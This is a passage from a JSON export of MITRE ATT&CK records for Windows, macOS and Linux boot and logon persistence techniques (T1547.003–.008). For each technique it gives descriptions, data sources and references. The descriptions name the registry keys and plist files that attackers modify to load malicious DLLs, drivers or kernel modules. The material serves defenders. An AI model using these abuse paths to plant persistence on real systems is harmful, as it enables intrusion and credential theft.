        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc",
    "platform": "windows",
    "tid": "T1547.003",
    "technique": "Time Providers",
    "tactic": "persistence",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|file-monitoring|loaded-dlls|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)<!-- raw HTML omitted --><!-- raw HTML omitted -->Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders&lt;/code&gt;. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft W32Time Feb 2018",
        "url": "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top",
        "description": "Microsoft. (2018, February 1). Windows Time Service (W32Time). Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft TimeProvider",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx",
        "description": "Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Github W32Time Oct 2017",
        "url": "https://github.com/scottlundgren/w32time",
        "description": "Lundgren, S. (2017, October 28). w32time. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft W32Time May 2017",
        "url": "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings",
        "description": "Mathers, B. (2017, May 31). Windows Time Service Tools and Settings. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc",
    "platform": "windows",
    "tid": "T1547.003",
    "technique": "Time Providers",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|file-monitoring|loaded-dlls|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)<!-- raw HTML omitted --><!-- raw HTML omitted -->Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders&lt;/code&gt;. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft W32Time Feb 2018",
        "url": "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top",
        "description": "Microsoft. (2018, February 1). Windows Time Service (W32Time). Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft TimeProvider",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx",
        "description": "Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Github W32Time Oct 2017",
        "url": "https://github.com/scottlundgren/w32time",
        "description": "Lundgren, S. (2017, October 28). w32time. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft W32Time May 2017",
        "url": "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings",
        "description": "Mathers, B. (2017, May 31). Windows Time Service Tools and Settings. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
    "platform": "windows",
    "tid": "T1547.004",
    "technique": "Winlogon Helper DLL",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <!-- raw HTML omitted -->HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&lt;/code&gt; and <!-- raw HTML omitted -->HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&lt;/code&gt; are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) <!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events<!-- raw HTML omitted -->* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on<!-- raw HTML omitted -->* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/579.html",
        "description": "none",
        "external_id": "CAPEC-579"
      },
      {
        "source_name": "Cylance Reg Persistence Sept 2013",
        "url": "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
        "description": "Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
    "platform": "windows",
    "tid": "T1547.004",
    "technique": "Winlogon Helper DLL",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <!-- raw HTML omitted -->HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&lt;/code&gt; and <!-- raw HTML omitted -->HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&lt;/code&gt; are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) <!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events<!-- raw HTML omitted -->* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on<!-- raw HTML omitted -->* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/579.html",
        "description": "none",
        "external_id": "CAPEC-579"
      },
      {
        "source_name": "Cylance Reg Persistence Sept 2013",
        "url": "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
        "description": "Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462",
    "platform": "windows",
    "tid": "T1547.005",
    "technique": "Security Support Provider",
    "tactic": "persistence",
    "datasources": "dll-monitoring|loaded-dlls|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user’s Domain password or smart card PINs.<!-- raw HTML omitted --><!-- raw HTML omitted -->The SSP configuration is stored in two Registry keys: <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages<!-- raw HTML omitted --> and <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages<!-- raw HTML omitted -->. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)</p>\n",
    "technique_references": [
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Configure LSA",
        "url": "https://technet.microsoft.com/en-us/library/dn408187.aspx",
        "description": "Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462",
    "platform": "windows",
    "tid": "T1547.005",
    "technique": "Security Support Provider",
    "tactic": "privilege-escalation",
    "datasources": "dll-monitoring|loaded-dlls|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user’s Domain password or smart card PINs.<!-- raw HTML omitted --><!-- raw HTML omitted -->The SSP configuration is stored in two Registry keys: <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages<!-- raw HTML omitted --> and <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages<!-- raw HTML omitted -->. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)</p>\n",
    "technique_references": [
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Configure LSA",
        "url": "https://technet.microsoft.com/en-us/library/dn408187.aspx",
        "description": "Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6",
    "platform": "macos|linux",
    "tid": "T1547.006",
    "technique": "Kernel Modules and Extensions",
    "tactic": "persistence",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) <!-- raw HTML omitted --><!-- raw HTML omitted -->When used maliciously, LKMs can be a type of kernel-mode <a href=\"https://attack.mitre.org/techniques/T1014\">Rootkit</a> that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)<!-- raw HTML omitted --><!-- raw HTML omitted -->Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <!-- raw HTML omitted -->kextload<!-- raw HTML omitted --> and <!-- raw HTML omitted -->kextunload<!-- raw HTML omitted --> commands.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir) (Citation: Trend Micro Skidmap)</p>\n",
    "technique_references": [
      {
        "source_name": "Linux Kernel Programming",
        "url": "https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf",
        "description": "Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel Module Programming Guide",
        "url": "http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html",
        "description": "Pomerantz, O., Salzman, P. (2003, April 4). Modules vs Programs. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "iDefense Rootkit Overview",
        "url": "http://www.megasecurity.org/papers/Rootkits.pdf",
        "description": "Chuvakin, A. (2003, February). An Overview of Rootkits. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Volatility Phalanx2",
        "url": "https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html",
        "description": "Case, A. (2012, October 10). Phalanx 2 Revealed: Using Volatility to Analyze an Advanced Linux Rootkit. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CrowdStrike Linux Rootkit",
        "url": "https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/",
        "description": "Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Reptile",
        "url": "https://github.com/f0rb1dd3n/Reptile",
        "description": "Augusto, I. (2018, March 8). Reptile - LMK Linux rootkit. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Diamorphine",
        "url": "https://github.com/m0nad/Diamorphine",
        "description": "Mello, V. (2018, March 8). Diamorphine - LMK rootkit for Linux Kernels 2.6.x/3.x/4.x (x86 and x86_64). Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "RSAC 2015 San Francisco Patrick Wardle",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Wardle, P. (2015, April). Malware Persistence on OS X Yosemite. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Synack Secure Kernel Extension Broken",
        "url": "https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/",
        "description": "Wardle, P. (2017, September 8). High Sierra’s ‘Secure Kernel Extension Loading’ is Broken. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Securelist Ventir",
        "url": "https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/",
        "description": "Mikhail, K. (2014, October 16). The Ventir Trojan: assemble your MacOS spy. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro Skidmap",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/",
        "description": "Remillano, A., Urbanec, J. (2019, September 19). Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload. Retrieved June 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Loadable Kernel Module Insert and Remove LKMs",
        "url": "http://tldp.org/HOWTO/Module-HOWTO/x197.html",
        "description": "Henderson, B. (2006, September 24). How To Insert And Remove LKMs. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Loadable Kernel Module",
        "url": "https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux",
        "description": "Wikipedia. (2018, March 17). Loadable kernel module. Retrieved April 9, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6",
    "platform": "macos|linux",
    "tid": "T1547.006",
    "technique": "Kernel Modules and Extensions",
    "tactic": "privilege-escalation",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) <!-- raw HTML omitted --><!-- raw HTML omitted -->When used maliciously, LKMs can be a type of kernel-mode <a href=\"https://attack.mitre.org/techniques/T1014\">Rootkit</a> that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)<!-- raw HTML omitted --><!-- raw HTML omitted -->Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <!-- raw HTML omitted -->kextload<!-- raw HTML omitted --> and <!-- raw HTML omitted -->kextunload<!-- raw HTML omitted --> commands.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir) (Citation: Trend Micro Skidmap)</p>\n",
    "technique_references": [
      {
        "source_name": "Linux Kernel Programming",
        "url": "https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf",
        "description": "Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel Module Programming Guide",
        "url": "http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html",
        "description": "Pomerantz, O., Salzman, P. (2003, April 4). Modules vs Programs. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "iDefense Rootkit Overview",
        "url": "http://www.megasecurity.org/papers/Rootkits.pdf",
        "description": "Chuvakin, A. (2003, February). An Overview of Rootkits. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Volatility Phalanx2",
        "url": "https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html",
        "description": "Case, A. (2012, October 10). Phalanx 2 Revealed: Using Volatility to Analyze an Advanced Linux Rootkit. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CrowdStrike Linux Rootkit",
        "url": "https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/",
        "description": "Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Reptile",
        "url": "https://github.com/f0rb1dd3n/Reptile",
        "description": "Augusto, I. (2018, March 8). Reptile - LMK Linux rootkit. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Diamorphine",
        "url": "https://github.com/m0nad/Diamorphine",
        "description": "Mello, V. (2018, March 8). Diamorphine - LMK rootkit for Linux Kernels 2.6.x/3.x/4.x (x86 and x86_64). Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "RSAC 2015 San Francisco Patrick Wardle",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Wardle, P. (2015, April). Malware Persistence on OS X Yosemite. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Synack Secure Kernel Extension Broken",
        "url": "https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/",
        "description": "Wardle, P. (2017, September 8). High Sierra’s ‘Secure Kernel Extension Loading’ is Broken. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Securelist Ventir",
        "url": "https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/",
        "description": "Mikhail, K. (2014, October 16). The Ventir Trojan: assemble your MacOS spy. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro Skidmap",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/",
        "description": "Remillano, A., Urbanec, J. (2019, September 19). Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload. Retrieved June 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Loadable Kernel Module Insert and Remove LKMs",
        "url": "http://tldp.org/HOWTO/Module-HOWTO/x197.html",
        "description": "Henderson, B. (2006, September 24). How To Insert And Remove LKMs. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Loadable Kernel Module",
        "url": "https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux",
        "description": "Wikipedia. (2018, March 17). Loadable kernel module. Retrieved April 9, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e",
    "platform": "macos",
    "tid": "T1547.007",
    "technique": "Re-opened Applications",
    "tactic": "persistence",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <!-- raw HTML omitted -->~/Library/Preferences/com.apple.loginwindow.plist<!-- raw HTML omitted --> and <!-- raw HTML omitted -->~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist<!-- raw HTML omitted -->. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).</p>\n",
    "technique_references": [
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e",
    "platform": "macos",
    "tid": "T1547.007",
    "technique": "Re-opened Applications",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <!-- raw HTML omitted -->~/Library/Preferences/com.apple.loginwindow.plist<!-- raw HTML omitted --> and <!-- raw HTML omitted -->~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist<!-- raw HTML omitted -->. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).</p>\n",
    "technique_references": [
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4",
    "platform": "windows",
    "tid": "T1547.008",
    "technique": "LSASS Driver",
    "tactic": "persistence",
    "datasources": "dll-monitoring|file-monitoring|loaded-dlls|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., <a href=\"https://attack.mitre.org/techniques/T1574\">Hijack Execution Flow</a>), an adversary can use LSA operations to continuously execute malicious payloads.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Security Subsystem",
        "url": "https://technet.microsoft.com/library/cc961760.aspx",
        "description": "Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft LSA Protection Mar 2014",
        "url": "https://technet.microsoft.com/library/dn408187.aspx",
        "description": "Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DLL Security",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx",
        "description": "Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
